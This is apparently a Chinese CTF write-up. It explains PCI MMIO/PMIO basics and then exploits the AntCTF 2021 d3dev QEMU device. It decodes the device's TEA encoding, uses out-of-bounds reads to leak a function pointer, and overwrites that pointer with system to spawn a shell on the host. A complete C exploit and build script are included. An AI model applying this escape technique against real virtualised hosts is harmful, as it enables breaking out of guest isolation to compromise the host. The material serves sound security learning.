# 一、QEMU逃逸  --  basic 

> ~~玩不懂kernel的菜鸡来霍霍qemu辣~~

## 0x00 lspci

pci外设地址，形如`0000:00:1f.1`。第一个部分16位表示域；第二个部分8位表示总线编号；第三个部分5位表示设备号；最后一个部分3位表示功能号。下面是`lspci`的输出，其中`pci`设备的地址，在最头部给出，由于`pc`设备总只有一个0号域，所以会省略域。

![image](https://p4.ssl.qhimg.com/t01e511a0ccabc44633.png)

`lspci -v -t`会用树状图的形式输出pci设备，会显得更加直观

![image](https://p2.ssl.qhimg.com/t0106de490068b32c99.png)

`lspci -v`就能输出设备的详细信息

![image](https://p0.ssl.qhimg.com/t01a78f0178e71b000f.png)

仔细观察相关的输出，可以从中知道`mmio`的地址是`0xfebf1000`，`pmio`的端口是`0xc050`。

![image](https://p1.ssl.qhimg.com/t0129b36299082dc698.png)

在`/sys/bus/pci/devices`可以找到每个总线设备相关的一写文件。

![image](https://p3.ssl.qhimg.com/t01ddba05509f456110.png)

![image](https://p0.ssl.qhimg.com/t016c20a809c748def6.png)

每个设备的目录下`resource0` 对应`MMIO`空间。`resource1` 对应`PMIO`空间。
`resource`文件里面会记录相关的数据，第一行就是`mimo`的信息，从左到右是：起始地址、结束地址、标识位。

## 0x01. AntCTF 2021 d3dev

### 1. 分析

```sh
#!/bin/sh
./qemu-system-x86_64 \
-L pc-bios/ \
-m 128M \
-kernel vmlinuz \
-initrd rootfs.img \
-smp 1 \
-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokaslr quiet" \
-device d3dev \
-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
-nographic \
-monitor /dev/null
```

启动脚本中出现``-device d3dev``

使用IDA pro反汇编qemu，查找d3dev

在`d3dev_class_init()`函数中找到注册了PCI设备d3dev

其中

````c
  LODWORD(v2[2].object_cast_cache[0]) = 0x11E82333;
  BYTE4(v2[2].object_cast_cache[0]) = 0x10;
  HIWORD(v2[2].object_cast_cache[0]) = 0xFF;
````

可以知道d3dev设备的Device id（0x11E8）和Vendor id（0x2333）

之后在``pci_d3dev_realize()``函数中可以找到该设备MMIO和PMIO的读写操作函数，且MMIO的内存大小为0x800，PMIO的内存大小为0x20，在读写的时候如果访问的地址在其范围内则会调用相关的读写函数

````c
void __fastcall pci_d3dev_realize(PCIDevice_0 *pdev, Error_0 **errp)
{
  memory_region_init_io(
    (MemoryRegion_0 *)&pdev[1],
    &pdev->qdev.parent_obj,
    &d3dev_mmio_ops,
    pdev,
    "d3dev-mmio",
    0x800uLL);
  pci_register_bar(pdev, 0, 0, (MemoryRegion_0 *)&pdev[1]);
  memory_region_init_io(
    (MemoryRegion_0 *)&pdev[1].name[56],
    &pdev->qdev.parent_obj,
    &d3dev_pmio_ops,
    pdev,
    "d3dev-pmio",
    0x20uLL);
  pci_register_bar(pdev, 1, 1u, (MemoryRegion_0 *)&pdev[1].name[56]);
}
````

之后查看mmio和pmio的读写函数，但是在详细分析之前修改这些函数的第一个参数

第一个参数默认为`void *opaque`

但是明显可以看到他是一个指向自定义结构体的指针，我们可以：

> 选中opaque  ->  右键Convert to struct*  ->  d3devState

具体的结构体名词可以在`pci_d3dev_realize()`函数中查看汇编查看

![](https://pic1.imgdb.cn/item/6357cdda16f2c2beb1c3ed00.png)

可以在IDA中详细查看这个结构体的定义

````c
00000000 d3devState struc ; (sizeof=0x1300, align=0x10, copyof_4545)
00000000 pdev PCIDevice_0 ?
000008E0 mmio MemoryRegion_0 ?
000009D0 pmio MemoryRegion_0 ?
00000AC0 memory_mode dd ?
00000AC4 seek dd ?
00000AC8 init_flag dd ?
00000ACC mmio_read_part dd ?
00000AD0 mmio_write_part dd ?
00000AD4 r_seed dd ?
00000AD8 blocks dq 257 dup(?)
000012E0 key dd 4 dup(?)
000012F0 rand_r dq ?                             ; offset
000012F8 db ? ; undefined
000012F9 db ? ; undefined
000012FA db ? ; undefined
000012FB db ? ; undefined
000012FC db ? ; undefined
000012FD db ? ; undefined
000012FE db ? ; undefined
000012FF db ? ; undefined
00001300 d3devState ends
00001300
````

之后分析mmio_read和mmio_write的操作

根据IDA可以看出，`d3dev_mmio_read()`该函数首先通过`seek`和`addr`来从`opaque->blocks`中取出`block`，然后经过`tea`编码后，返回给用户。

从上面数据结构中，可知`block`的长度为`0x100`，而我们这里传入的`addr`并没有检查范围，所以可以超过`0x100`，从而发生越界读取。而这里越界之后，可以读取`key`和`rand_r`的值。

接着看`d3dev_write`:该函数主要是将传入的`val`赋值给`opaque->blocks[offset]`。如果是奇数次，则直接赋值。如果是偶数次则先加密再赋值。这里也没有对`addr`进行范围检查，可以越界写。

之后`d3dev_pmio_read()`

![](https://pic1.imgdb.cn/item/6357d1ad16f2c2beb1c9063b.png)

`d3dev_pmio_read`基本功能就是，通过输入不同的`addr`，会进入不同`switch-case`。这里就会将`opaque->key`的四个值进行返回。

`d3dev_pmio_write`会去调用`rand_r`函数指针，这个指针存储的是`rand`函数地址。

![](https://pic1.imgdb.cn/item/6357d23b16f2c2beb1c9c6f4.png)

### 2. 漏洞利用

利用mmio_read的越界读获得key值和rand_r的值，其中rand_r保存的rand函数的地址，实现泄露地址，我们通过越界读泄漏该地址，那么就可以得到`qemu`的基址。

得到了`qemu`基址后，我们就可以计算得到`system`函数的地址。

然后通过越界写，修改`rand_r`存储的函数指针为`system`。然后去触发`system`函数。

在`d3dev_mmio_write`函数中的越界写可以直接修改结构体中的数据，两个分支一个可以直接覆写4字节，另一个经过加密后可以覆写8字节；`d3dev_mmio_read`读取的数据要经过随机数key和key1进行加密，可以通过越界写将两处key内存覆盖为0或在`d3dev_pmio_write`函数中将两处key都设置为0

这里想实现`getshell`，可以去执行`rand_r`函数，并设置参数为`sh`。

查看mmio和pmio基地址的方法：

````sh
/sys/devices/pci0000:00/0000:00:03.0 # cat resource
0x00000000febf1000 0x00000000febf17ff 0x0000000000040200
0x000000000000c040 0x000000000000c05f 0x0000000000040101

````

其中0x00000000febf1000就是mmio地址；0x000000000000c040就是pmio地址

### 3. Exploit

````c
#include<stdint.h>
#include<fcntl.h>
#include<sys/mman.h>
#include<sys/io.h>
#include<stdio.h>
#include<unistd.h>

unsigned char* mmio_mem;

void Err(char * err){
    printf("Error: %s\n",err);
    exit(-1);
}

void init_pmio(){
    iopl(3); // 0x3ff 以上端口全部开启访问
}

void init_mmio(){
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:03.0/resource0",O_RDWR|O_SYNC);
    mmio_mem = mmap(0,0x1000,PROT_READ|PROT_WRITE,MAP_SHARED,mmio_fd,0);
}

void mmio_write(uint32_t addr,uint32_t value){
    *(uint32_t*)(mmio_mem+addr) = value;
}

uint64_t mmio_read(uint64_t addr){
    return *(uint64_t*)(mmio_mem+addr); 
}

uint32_t pmio_base = 0xc040;

void pmio_write(uint32_t addr,uint32_t value){
    outl(value,pmio_base+addr);
}

uint64_t pmio_read(uint32_t addr){
    return (uint64_t)inl(pmio_base+addr);
}

uint64_t encode(uint32_t high, uint32_t low) {

    uint32_t addr = 0xC6EF3720;

    for (int i = 0; i < 32; ++i) {
        high = high - ((low + addr) ^ (low >> 5) ^ (16 * low));
        low = low - (((high + addr) ^ (high >> 5) ^ (16 * high)));
        addr += 0x61C88647;
    }

    return (uint64_t)high * 0x100000000 + low;
}

uint64_t decode(uint32_t high, uint32_t low) {

    uint32_t addr = 0x0;

    for (int i = 0; i < 32; ++i) {
        addr -= 0x61C88647;
        low += (((high + addr) ^ (high >> 5) ^ (16 * high)));
        high += ((low + addr) ^ (low >> 5) ^ (16 * low));
    }

    return (uint64_t)high * 0x100000000 + low;
}

int main(){
    printf("init pci and mmio:\n");
    init_pmio();
    init_mmio();

    printf("set seek = 0x100\n");
    pmio_write(0x8,0x100);
    printf("set key = 0x0\n");
    pmio_write(0x4,0);


    printf("oob read rand_r\n");
    uint64_t value = mmio_read(3*8);
    printf("%lx\n",value);

    uint64_t rand_r = decode(value>>32, value&0xffffffff);
    printf("%lx\n", rand_r);

    uint64_t system_addr = rand_r+0xa560;
    printf("system_addr ==> %lx\n", system_addr);

    uint64_t encode_system = encode(system_addr>>32, system_addr&0xffffffff);
    printf("encode_system ==> %lx\n", encode_system);

    uint32_t es_low  = encode_system % 0x100000000;
    uint32_t es_high = encode_system / 0x100000000;

    printf("oob write\n");
    mmio_write(3*8, es_low);
    sleep(1);
    mmio_write(3*8, es_high);

    printf("set seek=0x0\n");
    pmio_write(0x8, 0x0);


    pmio_write(0x1c,0x6873); // 0x6873 == "sh"

}

````

````sh
#!bash
gcc expliot.c -o expliot --static &&\
chmod +x expliot &&\
cp ./expliot ./cpio-root/expliot &&\
cd ./cpio-root &&\
find . | cpio -o --format=newc > ../rootfs.img
````

